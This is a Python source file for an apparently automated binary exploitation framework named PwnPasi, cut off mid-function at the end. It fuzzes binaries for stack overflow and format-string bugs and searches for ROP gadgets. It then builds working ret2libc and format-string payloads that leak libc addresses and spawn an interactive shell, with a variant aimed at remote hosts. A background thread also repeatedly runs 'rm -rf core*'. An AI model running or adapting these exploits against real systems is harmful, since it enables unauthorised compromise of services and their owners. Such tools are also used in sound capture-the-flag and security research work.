#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PwnPasi - Automated Binary Exploitation Tool
Version: 3.0
Author: Security Research Team
Description: Professional automated PWN exploitation framework with sqlmap-style output
"""

from pwn import *
from LibcSearcher import *
import argparse
import sys
import os
import re
import subprocess
import time
import datetime
import threading
from elftools.elf.elffile import ELFFile
from elftools.elf.sections import SymbolTableSection

# Disable core dump files (Unix/Linux only)
try:
    import resource
    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
except:
    pass

# Configure pwntools to prevent core dumps
context.log_level = 'error'
context.terminal = ['bash', '-c']
try:
    # Additional core dump prevention
    os.system('ulimit -c 0 2>/dev/null || true')
except:
    pass

# Core file cleanup thread
def cleanup_core_files():
    """Background thread to continuously remove core files"""
    while True:
        try:
            # Remove core files in current directory
            os.system('rm -rf core* 2>/dev/null || del core* 2>nul || true')
            time.sleep(1)  # Check every second
        except:
            pass

# Start core cleanup thread
cleanup_thread = threading.Thread(target=cleanup_core_files, daemon=True)
cleanup_thread.start()

# Global configuration
VERSION = "3.0"
AUTHOR = "Security Research Team"
GITHUB = "https://github.com/heimao-box/pwnpasi"

# Color schemes (similar to sqlmap)
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    
    # Sqlmap-style colors
    INFO = '\033[1;34m'     # Blue bold
    SUCCESS = '\033[1;32m'  # Green bold
    WARNING = '\033[1;33m'  # Yellow bold
    ERROR = '\033[1;31m'    # Red bold
    CRITICAL = '\033[1;35m' # Magenta bold
    PAYLOAD = '\033[1;36m'  # Cyan bold

def print_banner():
    banner = f"""
{Colors.BOLD}{Colors.BLUE}
        ____                 ____            _ 
       |  _ \ __      ___ _|  _ \ __ _ ___(_)
       | |_) |\ \ /\ / / '_ \ |_) / _` / __| |
       |  __/  \ V  V /| | | |  __/ (_| \__ \ |
       |_|      \_/\_/ |_| |_|_|   \__,_|___/_|
{Colors.END}
{Colors.BOLD}    Automated Binary Exploitation Framework v{VERSION}{Colors.END}
{Colors.CYAN}    by {AUTHOR}{Colors.END}
{Colors.UNDERLINE}    {GITHUB}{Colors.END}
"""
    print(banner)

def print_info(message, prefix="[*]"):
    """Print info message with sqlmap-style formatting"""
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    print(f"{Colors.INFO}{prefix}{Colors.END} {Colors.BOLD}[{timestamp}]{Colors.END} {message}")

def print_success(message, prefix="[+]"):
    """Print success message"""
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    print(f"{Colors.SUCCESS}{prefix}{Colors.END} {Colors.BOLD}[{timestamp}]{Colors.END} {message}")

def print_warning(message, prefix="[!]"):
    """Print warning message"""
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    print(f"{Colors.WARNING}{prefix}{Colors.END} {Colors.BOLD}[{timestamp}]{Colors.END} {message}")

def print_error(message, prefix="[-]"):
    """Print error message"""
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    print(f"{Colors.ERROR}{prefix}{Colors.END} {Colors.BOLD}[{timestamp}]{Colors.END} {message}")

def print_critical(message, prefix="[CRITICAL]"):
    """Print critical message"""
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    print(f"{Colors.CRITICAL}{prefix}{Colors.END} {Colors.BOLD}[{timestamp}]{Colors.END} {message}")

def print_payload(message, prefix="[PAYLOAD]"):
    """Print payload information"""
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    print(f"{Colors.PAYLOAD}{prefix}{Colors.END} {Colors.BOLD}[{timestamp}]{Colors.END} {message}")

def print_section_header(title):
    """Print section header with decorative lines"""
    line = "─" * 60
    print(f"\n{Colors.BOLD}{Colors.BLUE}┌{line}┐{Colors.END}")
    print(f"{Colors.BOLD}{Colors.BLUE}│{Colors.END} {Colors.BOLD}{title.center(58)}{Colors.END} {Colors.BOLD}{Colors.BLUE}│{Colors.END}")
    print(f"{Colors.BOLD}{Colors.BLUE}└{line}┘{Colors.END}")

def print_progress(current, total, task_name):
    """Print progress bar similar to sqlmap"""
    percentage = int((current / total) * 100)
    bar_length = 30
    filled_length = int(bar_length * current // total)
    bar = '█' * filled_length + '░' * (bar_length - filled_length)
    print(f"\r{Colors.INFO}[*]{Colors.END} {task_name}: {Colors.CYAN}[{bar}]{Colors.END} {percentage}%", end='', flush=True)
    if current == total:
        print_info("")  # New line when complete

def print_table_header(headers):
    """Print table header"""
    header_line = " | ".join([f"{h:^15}" for h in headers])
    separator = "-" * len(header_line)
    print(f"{Colors.BOLD}{header_line}{Colors.END}")
    print(separator)

def print_table_row(values, colors=None):
    """Print table row with optional colors"""
    if colors is None:
        colors = [Colors.END] * len(values)
    
    formatted_values = []
    for i, (value, color) in enumerate(zip(values, colors)):
        formatted_values.append(f"{color}{str(value):^15}{Colors.END}")
    
    row_line = " | ".join(formatted_values)
    print(row_line)

def set_permission(program):
    """Set executable permissions for the program"""
    try:
        os.system(f"chmod +755 {program}")
        return True
    except Exception as e:
        print_error(f"Failed to set permissions: {e}")
        return False

def add_current_directory_prefix(program):
    """Add ./ prefix if not present"""
    if not program.startswith('./'):
        program = os.path.join('.', program)
    return program

def detect_libc(program):
    """Detect libc path automatically"""
    print_info("detecting libc path automatically")
    libc_path = None
    
    try:
        os.system(f"ldd {program} | awk '{{$1=$1; print}}' > libc_path.txt")
        
        with open("libc_path.txt", "r") as file:
            for line in file:
                if 'libc.so.6' in line:
                    parts = line.split('=>')
                    if len(parts) > 1:
                        libc_path = parts[1].strip().split()[0]
                        print_success(f"libc path detected: {Colors.YELLOW}{libc_path}{Colors.END}")
                        break
        
        if not libc_path:
            print_warning("libc path not found in ldd output")
            
    except Exception as e:
        print_error(f"failed to detect libc: {e}")
    
    return libc_path

def ldd_libc(program):
    """Automatically detect libc path using ldd command"""
    libc_path = None
    
    try:
        # Use ldd to get library information
        result = subprocess.run(['ldd', program], capture_output=True, text=True)
        if result.returncode == 0:
            for line in result.stdout.split('\n'):
                if 'libc.so.6' in line:
                    parts = line.split('=>')
                    if len(parts) > 1:
                        libc_path = parts[1].strip().split()[0]
                        print_info(f"automatically detected libc: {Colors.YELLOW}{libc_path}{Colors.END}")
                        break
        
        if not libc_path:
            print_warning("libc path not found automatically")
            
    except Exception as e:
        print_error(f"failed to detect libc: {e}")
    
    return libc_path

def Information_Collection(program):
    """Collect binary information using checksec"""
    try:
        # Run checksec command
        result = subprocess.run(['checksec', program], capture_output=True, text=True)
        content = result.stdout
        
        info_dict = {}
        
        # Parse architecture
        arch_match = re.search(r"Arch:\s+(\S+)", content)
        if arch_match:
            arch = arch_match.group(1)
            if '64' in arch:
                info_dict['bit'] = 64
                bit = 64
            elif '32' in arch:
                info_dict['bit'] = 32
                bit = 32
        
        # Parse security features
        keys = ['RELRO', 'Stack', 'NX', 'PIE', 'Stripped', 'RWX']
        for key in keys:
            if key in content:
                for line in content.split('\n'):
                    if key in line and ':' in line:
                        info_dict[key] = line.split(":")[1].strip()
                        break
        
        # Determine stack protection
        stack = 0
        if 'Stack' in info_dict:
            if info_dict['Stack'] == 'No canary found':
                stack = 0
            elif info_dict['Stack'] == 'Canary found':
                stack = 1
            elif info_dict['Stack'] == 'Executable':
                stack = 2
        
        # Determine RWX segments
        rwx = 0
        if 'RWX' in info_dict:
            if info_dict['RWX'] == 'Has RWX segments':
                rwx = 1
        
        # Determine PIE
        pie = None
        if 'PIE' in info_dict:
            if info_dict['PIE'] == 'PIE enabled':
                pie = 1
        
        # Display information
        for key, value in info_dict.items():
            print_info(f"{key}: {Colors.YELLOW}{value}{Colors.END}")
        
        return stack, rwx, bit, pie
        
    except Exception as e:
        print_error(f"failed to collect binary information: {e}")
        return 0, 0, 32, None

def collect_binary_info(program):
    """Collect comprehensive binary information"""
    print_info("collecting binary information")
    
    try:
        os.system(f"checksec {program} > Information_Collection.txt 2>&1")
        
        with open("Information_Collection.txt", 'r') as f:
            content = f.readlines()
        
        result = {}
        
        # Parse architecture
        arch_match = re.search(r"Arch:\s+(\S+)", "".join(content))
        if arch_match:
            arch = arch_match.group(1)
            result['arch'] = arch
            if '64' in arch:
                result['bit'] = 64
            elif '32' in arch:
                result['bit'] = 32
        
        # Parse security features
        security_features = ['RELRO', 'Stack', 'NX', 'PIE', 'Stripped', 'RWX']
        for feature in security_features:
            for line in content:
                if feature in line:
                    result[feature] = line.split(":")[1].strip()
                    break
        
        # Process stack canary
        stack_protection = 0
        if 'Stack' in result:
            if result['Stack'] == 'No canary found':
                stack_protection = 0
            elif result['Stack'] == 'Canary found':
                stack_protection = 1
        
        # Process RWX segments
        rwx_segments = 0
        if 'RWX' in result:
            if result['RWX'] == 'Has RWX segments':
                rwx_segments = 1
        
        # Process PIE
        pie_enabled = 0
        if 'PIE' in result:
            if result['PIE'] == 'PIE enabled':
                pie_enabled = 1
        
        return result, stack_protection, rwx_segments, result.get('bit', 64), pie_enabled
        
    except Exception as e:
        print_error(f"failed to collect binary information: {e}")
        return {}, 0, 0, 64, 0

def display_binary_info(info_dict):
    """Display binary information in a professional table format"""
    print_section_header("BINARY SECURITY ANALYSIS")
    
    # Create table for security features
    headers = ["Feature", "Status", "Risk Level"]
    print_table_header(headers)
    
    risk_colors = {
        "HIGH": Colors.ERROR,
        "MEDIUM": Colors.WARNING, 
        "LOW": Colors.SUCCESS,
        "INFO": Colors.INFO
    }
    
    security_analysis = {
        "RELRO": ("MEDIUM" if "Partial" in info_dict.get("RELRO", "") else "LOW", info_dict.get("RELRO", "Unknown")),
        "Stack Canary": ("HIGH" if "No canary" in info_dict.get("Stack", "") else "LOW", info_dict.get("Stack", "Unknown")),
        "NX Bit": ("HIGH" if "disabled" in info_dict.get("NX", "") else "LOW", info_dict.get("NX", "Unknown")),
        "PIE": ("MEDIUM" if "No PIE" in info_dict.get("PIE", "") else "LOW", info_dict.get("PIE", "Unknown")),
        "RWX Segments": ("HIGH" if "Has RWX" in info_dict.get("RWX", "") else "LOW", info_dict.get("RWX", "Unknown"))
    }
    
    for feature, (risk, status) in security_analysis.items():
        colors = [Colors.END, Colors.END, risk_colors.get(risk, Colors.END)]
        print_table_row([feature, status, risk], colors)
    
    print()

def find_large_bss_symbols(program):
    """Find large BSS symbols suitable for shellcode storage"""
    print_info("searching for shellcode storage locations")
    
    try:
        with open(program, 'rb') as f:
            elf = ELFFile(f)
            symtab = elf.get_section_by_name('.symtab')
            
            if not symtab:
                print_warning("no symbol table found")
                return 0, None, None
            
            for symbol in symtab.iter_symbols():
                if (symbol['st_info'].type == 'STT_OBJECT' and symbol['st_size'] > 30):
                    print_success(f"shellcode storage found: {Colors.YELLOW}{symbol.name}{Colors.END} at {Colors.YELLOW}{hex(symbol['st_value'])}{Colors.END}")
                    return 1, hex(symbol['st_value']), symbol.name
            
            print_warning("no suitable shellcode storage locations found")
            return 0, None, None
            
    except Exception as e:
        print_error(f"failed to analyze symbols: {e}")
        return 0, None, None

def scan_plt_functions(program):
    """Scan and analyze PLT functions"""
    print_info("analyzing PLT table and available functions")
    
    try:
        os.system(f"objdump -d {program} > Objdump_Scan.txt 2>&1")
        target_functions = ["write", "puts", "printf", "main", "system", "backdoor", "callsystem"]
        function_addresses = {}
        found_functions = []
        
        with open("Objdump_Scan.txt", "r") as file:
            lines = file.readlines()
        
        print_section_header("FUNCTION ANALYSIS")
        headers = ["Function", "Address", "Available"]
        print_table_header(headers)
        
        for func in target_functions:
            found = False
            address = "N/A"
            
            for line in lines:
                if f"<{func}@plt>:" in line or f"<{func}>:" in line:
                    address = line.split()[0].strip(":")
                    function_addresses[func] = address
                    found_functions.append(func)
                    found = True
                    break
            
            status = "YES" if found else "NO"
            color = Colors.SUCCESS if found else Colors.ERROR
            colors = [Colors.END, Colors.YELLOW if found else Colors.END, color]
            print_table_row([func, address, status], colors)
        
        print_info("")
        return function_addresses
        
    except Exception as e:
        print_error(f"failed to scan PLT functions: {e}")
        return {}

def set_function_flags(function_addresses):
    """Set function availability flags"""
    target_functions = ["write", "puts", "printf", "main", "system", "backdoor", "callsystem"]
    function_flags = {func: (1 if func in function_addresses else 0) for func in target_functions}
    return function_flags

def find_rop_gadgets_x64(program):
    """Find ROP gadgets for x64 architecture"""
    print_info("searching for ROP gadgets (x64)")
    
    gadgets = {
        'pop_rdi': None,
        'pop_rsi': None, 
        'ret': None,
        'other_rdi_registers': None,
        'other_rsi_registers': None
    }
    
    try:
        # Search for pop rdi gadgets
        os.system(f"ropper --file {program} --search 'pop rdi' > ropper.txt --nocolor 2>&1")
        os.system(f"ropper --file {program} --search 'pop rsi' >> ropper.txt --nocolor 2>&1")
        os.system(f"ropper --file {program} --search 'ret' >> ropper.txt --nocolor 2>&1")
        
        with open("ropper.txt", "r") as file:
            lines = file.readlines()
        
        print_section_header("ROP GADGETS (x64)")
        headers = ["Gadget Type", "Address", "Instruction"]
        print_table_header(headers)
        
        for line in lines:
            if '[INFO]' in line:
                continue
                
            if "pop rdi;" in line and "pop rdi; pop" in line:
                gadgets['pop_rdi'] = line.split(":")[0].strip()
                gadgets['other_rdi_registers'] = 1
                print_table_row(["pop rdi (multi)", gadgets['pop_rdi'], "pop rdi; pop ...; ret"], [Colors.END, Colors.YELLOW, Colors.END])
                
            elif "pop rdi; ret;" in line:
                gadgets['pop_rdi'] = line.split(":")[0].strip()
                gadgets['other_rdi_registers'] = 0
                print_table_row(["pop rdi", gadgets['pop_rdi'], "pop rdi; ret"], [Colors.END, Colors.YELLOW, Colors.END])
                
            elif "pop rsi;" in line and "pop rsi; pop" in line:
                gadgets['pop_rsi'] = line.split(":")[0].strip()
                gadgets['other_rsi_registers'] = 1
                print_table_row(["pop rsi (multi)", gadgets['pop_rsi'], "pop rsi; pop ...; ret"], [Colors.END, Colors.YELLOW, Colors.END])
                
            elif "pop rsi; ret;" in line:
                gadgets['pop_rsi'] = line.split(":")[0].strip()
                gadgets['other_rsi_registers'] = 0
                print_table_row(["pop rsi", gadgets['pop_rsi'], "pop rsi; ret"], [Colors.END, Colors.YELLOW, Colors.END])
                
            elif "ret" in line and "ret " not in line:
                gadgets['ret'] = line.split(":")[0].strip()
                print_table_row(["ret", gadgets['ret'], "ret"], [Colors.END, Colors.YELLOW, Colors.END])
        
        print_info("")
        return gadgets['pop_rdi'], gadgets['pop_rsi'], gadgets['ret'], gadgets['other_rdi_registers'], gadgets['other_rsi_registers']
        
    except Exception as e:
        print_error(f"failed to find ROP gadgets: {e}")
        return None, None, None, None, None

def find_rop_gadgets_x32(program):
    """Find ROP gadgets for x32 architecture"""
    print_info("searching for ROP gadgets (x32)")
    
    gadgets = {
        'pop_eax': None, 'pop_ebx': None, 'pop_ecx': None, 'pop_edx': None,
        'pop_ecx_ebx': None, 'ret': None, 'int_0x80': None
    }
    
    registers_found = {'eax': 0, 'ebx': 0, 'ecx': 0, 'edx': 0}
    
    try:
        print_section_header("ROP GADGETS (x32)")
        headers = ["Gadget Type", "Address", "Status"]
        print_table_header(headers)
        
        # Search for each register gadget
        register_searches = ['eax', 'ebx', 'ecx', 'edx']
        
        for reg in register_searches:
            os.system(f"ropper --file {program} --search 'pop {reg};' > ropper.txt --nocolor 2>&1")
            
            with open("ropper.txt", "r") as file:
                lines = file.readlines()
                
            for line in lines:
                if '[INFO]' in line:
                    continue
                    
                if f"pop {reg}; ret;" in line:
                    address = line.split(":")[0].strip()
                    gadgets[f'pop_{reg}'] = address
                    registers_found[reg] = 1
                    print_table_row([f"pop {reg}", address, "FOUND"], [Colors.END, Colors.YELLOW, Colors.SUCCESS])
                    break
                elif f"pop {reg}" in line and 'pop ebx' in line and reg == 'ecx':
                    address = line.split(":")[0].strip()
                    gadgets['pop_ecx_ebx'] = address
                    registers_found[reg] = 1
                    print_table_row(["pop ecx; pop ebx", address, "FOUND"], [Colors.END, Colors.YELLOW, Colors.SUCCESS])
                    break
            
            if registers_found[reg] == 0:
                print_table_row([f"pop {reg}", "N/A", "NOT FOUND"], [Colors.END, Colors.END, Colors.ERROR])
        
        # Search for ret and int 0x80
        os.system(f"ropper --file {program} --search 'ret;' > ropper.txt --nocolor 2>&1")
        with open("ropper.txt", "r") as file:
            for line in file.readlines():
                if '[INFO]' in line:
                    continue
                if "ret" in line and "ret " not in line:
                    gadgets['ret'] = line.split(":")[0].strip()
                    print_table_row(["ret", gadgets['ret'], "FOUND"], [Colors.END, Colors.YELLOW, Colors.SUCCESS])
                    break
        
        os.system(f"ropper --file {program} --search 'int 0x80;' > ropper.txt --nocolor 2>&1")
        with open("ropper.txt", "r") as file:
            for line in file.readlines():
                if '[INFO]' in line:
                    continue
                if "int 0x80" in line:
                    gadgets['int_0x80'] = line.split(":")[0].strip()
                    print_table_row(["int 0x80", gadgets['int_0x80'], "FOUND"], [Colors.END, Colors.YELLOW, Colors.SUCCESS])
                    break
        
        print_info("")
        return (gadgets['pop_eax'], gadgets['pop_ebx'], gadgets['pop_ecx'], gadgets['pop_edx'],
                gadgets['pop_ecx_ebx'], gadgets['ret'], gadgets['int_0x80'],
                registers_found['eax'], registers_found['ebx'], registers_found['ecx'], registers_found['edx'])
        
    except Exception as e:
        print_error(f"failed to find ROP gadgets: {e}")
        return None, None, None, None, None, None, None, 0, 0, 0, 0

def test_stack_overflow(program, bit):
    """Test for stack overflow vulnerability with progress indication"""
    print_info("testing for stack overflow vulnerability")
    
    char = 'A'
    padding = 0
    max_test = 10000
    
    print_section_header("STACK OVERFLOW DETECTION")
    
    while padding < max_test:
        # Update progress every 100 iterations
        if padding % 100 == 0:
            print_progress(padding, max_test, "Testing overflow")
        
        input_data = char * (padding + 1)
        
        try:
            process = subprocess.Popen([program], stdin=subprocess.PIPE, 
                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate(input=input_data.encode(), timeout=1)
            
            if process.returncode == -11:  # SIGSEGV
                alignment = 8 if bit == 64 else 4
                final_padding = padding + alignment
                print_progress(max_test, max_test, "Testing overflow")
                print_success(f"stack overflow detected! Padding: {Colors.YELLOW}{final_padding}{Colors.END} bytes")
                return final_padding
                
        except subprocess.TimeoutExpired:
            process.kill()
        except Exception:
            pass
            
        padding += 1
    
    print_progress(max_test, max_test, "Testing overflow")
    print_warning("no stack overflow vulnerability detected")
    return 0

def analyze_vulnerable_functions(program, bit):
    """Analyze assembly code to find vulnerable functions"""
    print_info("analyzing vulnerable functions")
    
    try:
        with open("Objdump_Scan.txt", 'r') as f:
            content = f.read()
        
        func_pattern = r'^[0-9a-f]+ <(\w+)>:(.*?)(?=^\d+ <\w+>:|\Z)'
        functions = re.finditer(func_pattern, content, re.MULTILINE | re.DOTALL)
        
        vulnerable_functions = []
        
        for func in functions:
            func_name = func.group(1)
            func_body = func.group(2)
            
            # Check for dangerous function calls with lea instruction
            dangerous_calls = ['read', 'gets', 'fgets', 'scanf']
            has_lea = 'lea' in func_body
            has_dangerous_call = any(call in func_body for call in dangerous_calls)
            
            if has_lea and has_dangerous_call:
                lea_match = re.search(r'lea\s+(-?0x[0-9a-f]+)\(%[er]bp\)', func_body)
                if lea_match:
                    offset_hex = lea_match.group(1)
                    offset_dec = abs(int(offset_hex, 16))
                    alignment = 8 if bit == 64 else 4
                    padding = offset_dec + alignment
                    
                    vulnerable_functions.append({
                        'name': func_name,
                        'stack_size': offset_dec,
                        'padding': padding
                    })
        
        if vulnerable_functions:
            print_section_header("VULNERABLE FUNCTIONS")
            headers = ["Function", "Stack Size", "Padding"]
            print_table_header(headers)
            
            for func in vulnerable_functions:
                colors = [Colors.YELLOW, Colors.END, Colors.SUCCESS]
                print_table_row([func['name'], f"{func['stack_size']} bytes", f"{func['padding']} bytes"], colors)
            
            print_info("")
            return vulnerable_functions[0]['padding']  # Return first found
        
        return None
        
    except Exception as e:
        print_error(f"failed to analyze vulnerable functions: {e}")
        return None

def vuln_func_name():
    """Find vulnerable function names from objdump scan"""
    try:
        with open("Objdump_Scan.txt", 'r') as f:
            content = f.read()

        functions = re.split(r'\n\n', content.strip())

        results = []
        for func in functions:
            func_name_match = re.search(r'<([^>]+)>', func)
            if not func_name_match:
                continue
            func_name = func_name_match.group(1)

            has_lea = bool(re.search(r'\s+lea\s', func))
            has_call_read = bool(re.search(r'call.*read@plt', func))
            has_call_read += bool(re.search(r'call.*gets@plt', func))
            has_call_read += bool(re.search(r'call.*fgets@plt', func))
            has_call_read += bool(re.search(r'call.*scanf@plt', func))
            
            if has_lea and has_call_read:
                lea_match = re.search(r'lea\s+-\s*(0x[0-9a-f]+)', func)
                if lea_match:
                    results.append(func_name)

        return results
    except Exception as e:
        print_error(f"failed to find vulnerable function names: {e}")
        return []

def asm_stack_overflow(program, bit):
    """Assembly-based stack overflow analysis with padding adjustment"""
    print_info("performing assembly-based overflow analysis")
    
    try:
        with open("Objdump_Scan.txt", 'r') as f:
            content = f.read()
        
        func_pattern = r'^[0-9a-f]+ <(\w+)>:(.*?)(?=^\d+ <\w+>:|\Z)'
        functions = re.finditer(func_pattern, content, re.MULTILINE | re.DOTALL)
        
        for func in functions:
            func_body = func.group(2)
            
            # Check for vulnerable patterns
            dangerous_calls = ['read', 'gets', 'fgets', 'scanf']
            has_lea = 'lea' in func_body
            has_call = 'call' in func_body
            has_dangerous_call = any(call in func_body for call in dangerous_calls)
            
            if has_lea and has_call and has_dangerous_call:
                lea_match = re.search(r'lea\s+(-?0x[0-9a-f]+)\(%[er]bp\)', func_body)
                if lea_match:
                    offset_hex = lea_match.group(1)
                    offset_dec = abs(int(offset_hex, 16))
                    
                    if bit == 64:
                        padding = offset_dec + 8
                    else:
                        padding = offset_dec + 4
                    
                    print_success(f"stack size: {Colors.YELLOW}{offset_dec}{Colors.END} bytes")
                    print_success(f"overflow padding adjustment: {Colors.YELLOW}{padding}{Colors.END} bytes")
                    
                    return padding
        
        return None
        
    except Exception as e:
        print_error(f"failed to perform assembly analysis: {e}")
        return None

def check_binsh_string(program):
    """Check for /bin/sh string in binary"""
    print_info("checking for /bin/sh string")
    
    try:
        os.system(f'strings {program} | grep "/bin/sh" > check_binsh.txt')
        
        with open('check_binsh.txt', 'r') as file:
            content = file.read()
        
        if '/bin/sh' in content:
            print_success("/bin/sh string found in binary")
            return True
        else:
            print_warning("/bin/sh string not found in binary")
            return False
            
    except Exception as e:
        print_error(f"failed to check for /bin/sh string: {e}")
        return False

def check_binsh(program):
    """Check for /bin/sh string in binary (pwnpasi_base.py compatible)"""
    os.system('strings ' + program +' | grep "/bin/sh" > check_binsh.txt')
    with open('check_binsh.txt', 'r') as file:
        content = file.read()
    
    return '/bin/sh' in content

def detect_format_string_vulnerability(program):
    """Detect format string vulnerabilities"""
    print_info("testing for format string vulnerabilities")
    
    test_cases = [
        b"%x" * 20,
        b"%p" * 20, 
        b"%s" * 20,
        b"%n" * 5,
        b"AAAA%x%x%x%x",
        b"%99999999s",
    ]
    
    memory_pattern = re.compile(r'(0x[0-9a-fA-F]+)')
    vulnerable = False
    
    print_section_header("FORMAT STRING VULNERABILITY TEST")
    headers = ["Test Case", "Result", "Status"]
    print_table_header(headers)
    
    for i, case in enumerate(test_cases):
        try:
            proc = subprocess.Popen(
                [program],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
            )
            stdout, stderr = proc.communicate(input=case, timeout=2)
            
            result = "SAFE"
            color = Colors.SUCCESS
            
            if memory_pattern.search(stdout.decode()):
                result = "VULNERABLE"
                color = Colors.ERROR
                vulnerable = True
                
            if proc.returncode != 0:
                result = "CRASH"
                color = Colors.CRITICAL
                vulnerable = True
            
            case_str = case.decode()[:20] + "..." if len(case) > 20 else case.decode()
            colors = [Colors.END, Colors.END, color]
            print_table_row([case_str, result, "DETECTED" if result != "SAFE" else "NONE"], colors)
            
        except subprocess.TimeoutExpired:
            colors = [Colors.END, Colors.END, Colors.WARNING]
            print_table_row([case.decode()[:20], "TIMEOUT", "POSSIBLE"], colors)
            vulnerable = True
        except Exception as e:
            colors = [Colors.END, Colors.END, Colors.ERROR]
            print_table_row([case.decode()[:20], "ERROR", "UNKNOWN"], colors)
    
    print()
    
    if vulnerable:
        print_success("format string vulnerability detected!")
        return True
    else:
        print_warning("no format string vulnerability detected")
        return False

def find_ftmstr_bss_symbols(program):
    """Find format string BSS symbols"""
    function = 0
    with open(program, 'rb') as f:
        elf = ELFFile(f)
        symtab = elf.get_section_by_name('.symtab')
        if not symtab:
            print_warning("Did not find the variable used in the if-condition")
            return function
        for symbol in symtab.iter_symbols():
            if (symbol['st_info'].type == 'STT_OBJECT' and
                symbol['st_size'] > 2 and
                '_' not in symbol.name):
                print_success(f"Found the variable used in the if-condition: {symbol.name}, address: {hex(symbol['st_value'])}")
                function = 1
                buf_addr = hex(symbol['st_value'])
                function_name = symbol.name

    return function, buf_addr, function_name

def find_offset(program):
    """Find format string offset"""
    print_info("searching for format string offset")
    
    p = process(program)
    payload = b'AAAA' + b'.%x' * 40      # Payload to leak stack values
    print_payload(f"testing payload: {payload[:20]}...")
    
    p.sendline(payload)
    try:
        output = p.recv(timeout=2)       # Receive output from the program
    except:
        output = p.clean()              # If timeout, clean buffer
        
    parts = output.split(b'.')        # Split output by '.'
    for i in range(1, len(parts)):
        # Extract first word before space or newline after each '.'
        part = parts[i].split(b'\n')[0].split()[0] if b' ' in parts[i] else parts[i]
        try:
            val = int(part, 16)          # Convert hex string to int
            if val == 0x41414141:        # Check for 'AAAA' in hex
                p.close()
                print_success(f"format string offset found: {i}")
                return i                 # Return the offset where 'AAAA' appears
        except:
            continue
    p.close()
    print_error("offset not found")
    raise ValueError('[-]Offset not found')   # Raise if not found

def system_fmtstr(program, offset, buf_addr):
    """Format string exploitation (local)"""
    print_section_header("EXPLOITATION: Format String - Local")
    print_payload("preparing format string exploit")
    
    io = process(program)
    elf = ELF(program)
    buf_addr = int(buf_addr, 16)
    buf_addr = p32(buf_addr)
    system_addr = buf_addr
    offset_bytes = str(offset).encode()
    
    payload = system_addr + b'%' + offset_bytes + b'$n'
    print_payload(f"payload: {payload}")
    
    io.sendline(payload)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()

def ret2libc_write_x64(program, libc, padding, pop_rdi_addr, pop_rsi_addr, ret_addr, other_rdi_registers, other_rsi_registers, libc_path):
    """ret2libc exploitation using write function (x64)"""
    print_section_header("EXPLOITATION: ret2libc (write) - x64")
    print_payload("preparing ret2libc exploit using write function")
    
    io = process(program)
    
    if libc == 1:
        if libc_path is None:
            print_info("using LibcSearcher for libc resolution")
        else:
            print_info(f"using detected libc: {libc_path}")
            libc = ELF(libc_path)
    else:
        libc = ELF(libc)
    
    e = ELF(program)
    main_addr = e.symbols['main']
    write_plt = e.symbols['write']
    write_got = e.got['write']
    
    print_info(f"main address: {Colors.YELLOW}{hex(main_addr)}{Colors.END}")
    print_info(f"write@plt: {Colors.YELLOW}{hex(write_plt)}{Colors.END}")
    print_info(f"write@got: {Colors.YELLOW}{hex(write_got)}{Colors.END}")
    
    pop_rdi_addr = int(pop_rdi_addr, 16)
    pop_rsi_addr = int(pop_rsi_addr, 16)
    ret_addr = int(ret_addr, 16)
    
    # Stage 1: Leak write address
    print_payload("stage 1: leaking write address from GOT")
    if other_rsi_registers == 1:
        payload1 = flat([
            asm('nop') * padding,
            p64(pop_rdi_addr),
            p64(1),
            p64(pop_rsi_addr),
            p64(write_got),
            p64(0),
            p64(write_plt),
            p64(main_addr)
        ])
    elif other_rdi_registers == 1:
        payload1 = flat([
            asm('nop') * padding,
            p64(pop_rdi_addr),
            p64(1),
            p64(0),
            p64(pop_rsi_addr),
            p64(write_got),
            p64(write_plt),
            p64(main_addr)
        ])
    elif other_rdi_registers == 0 and other_rsi_registers == 0:
        payload1 = flat([
            asm('nop') * padding,
            p64(pop_rdi_addr),
            p64(1),
            p64(pop_rsi_addr),
            p64(write_got),
            p64(write_plt),
            p64(main_addr)
        ])
    
    io.recv()
    io.sendline(payload1)
    
    write_addr = u64(io.recv(8))
    print_success(f"write address leaked: {Colors.YELLOW}{hex(write_addr)}{Colors.END}")
    
    # Calculate system and /bin/sh addresses
    if libc == 1:
        libc = LibcSearcher("write", write_addr)
        libcbase = write_addr - libc.dump('write')
        system_addr = libcbase + libc.dump('system')
        sh_addr = libcbase + libc.dump('str_bin_sh')
    else:
        libc_write = libc.symbols['write']
        system_addr = write_addr - libc_write + libc.symbols['system']
        sh_addr = write_addr - libc_write + next(libc.search(b'/bin/sh'))
    
    print_success(f"system address calculated: {Colors.YELLOW}{hex(system_addr)}{Colors.END}")
    print_success(f"/bin/sh address calculated: {Colors.YELLOW}{hex(sh_addr)}{Colors.END}")
    
    # Stage 2: Execute system("/bin/sh")
    print_payload("stage 2: executing system('/bin/sh')")
    
    if other_rdi_registers == 1:
        payload2 = flat([
            asm('nop') * padding,
            p64(pop_rdi_addr),
            p64(sh_addr),
            p64(0),
            p64(system_addr),
            p64(0)
        ])
    else:
        payload2 = flat([
            asm('nop') * padding,
            p64(pop_rdi_addr),
            p64(sh_addr),
            p64(system_addr),
            p64(0)
        ])
    
    io.recv()
    
    io.sendline(payload2)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()

def ret2libc_write_x32_remote(program, libc, padding, url, port):
    """ret2libc exploitation using write function (x32 remote)"""
    print_section_header("EXPLOITATION: ret2libc (write) - x32 Remote")
    print_payload("preparing ret2libc exploit using write function")
    
    io = remote(url, port)
    
    if libc == 1:
        print_info("using LibcSearcher for libc resolution")
    else:
        libc = ELF(libc)
    
    e = ELF(program)
    main_addr = e.symbols['main']
    write_plt = e.symbols['write']
    write_got = e.got['write']
    
